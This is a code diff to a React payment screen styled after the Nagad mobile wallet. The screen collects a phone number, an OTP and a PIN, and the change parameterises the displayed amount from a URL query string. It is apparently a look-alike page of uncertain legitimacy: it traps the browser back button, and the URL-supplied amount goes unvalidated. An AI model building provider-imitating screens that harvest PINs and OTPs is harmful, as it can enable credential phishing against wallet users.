@@ -1,10 +1,12 @@
 import { useState, useEffect, useRef } from "react";
-import { useNavigate } from "react-router-dom";
+import { useNavigate, useSearchParams } from "react-router-dom";
 import cartIcon from "@/assets/cart-icon.png";
 import nagadLogoWhite from "@/assets/nagad-logo-white.png";
 
 const NagadPayment = () => {
   const navigate = useNavigate();
+  const [searchParams] = useSearchParams();
+  const amount = searchParams.get('amount') || "434";
   const [phoneDigits, setPhoneDigits] = useState<string[]>(Array(11).fill(""));
   const [showOtpView, setShowOtpView] = useState(false);
   const [showPinView, setShowPinView] = useState(false);
@@ -24,7 +26,7 @@ const NagadPayment = () => {
   useEffect(() => {
     window.history.pushState(null, "", window.location.href);
     const handlePopState = () => {
-      navigate("/payment-cancelled?channel=GenZ Direct Debit&reason=Payment isn't completed&amount=434.00", { replace: true });
+      navigate(`/payment-cancelled?channel=GenZ Direct Debit&reason=Payment isn't completed&amount=${amount}.00`, { replace: true });
     };
     window.addEventListener("popstate", handlePopState);
     return () => window.removeEventListener("popstate", handlePopState);
@@ -85,7 +87,7 @@ const NagadPayment = () => {
     setOtpResent(true);
   };
   const handleClose = () => {
-    navigate("/payment-cancelled?channel=GenZ Direct Debit&reason=Payment isn't completed&amount=434.00");
+    navigate(`/payment-cancelled?channel=GenZ Direct Debit&reason=Payment isn't completed&amount=${amount}.00`);
   };
 
   // Translations
@@ -175,7 +177,7 @@ const NagadPayment = () => {
                   </div>
                   <div className="flex">
                     <span className="text-[#ccc] font-bold text-xs min-[375px]:text-sm w-24 min-[375px]:w-32">{t.totalAmount}</span>
-                    <span className="text-[#ccc] font-bold text-xs min-[375px]:text-sm">BDT 434</span>
+                    <span className="text-[#ccc] font-bold text-xs min-[375px]:text-sm">BDT {amount}</span>
                   </div>
                   <div className="flex">
                     <span className="text-[#ccc] font-bold text-xs min-[375px]:text-sm w-24 min-[375px]:w-32">{t.charge}</span>
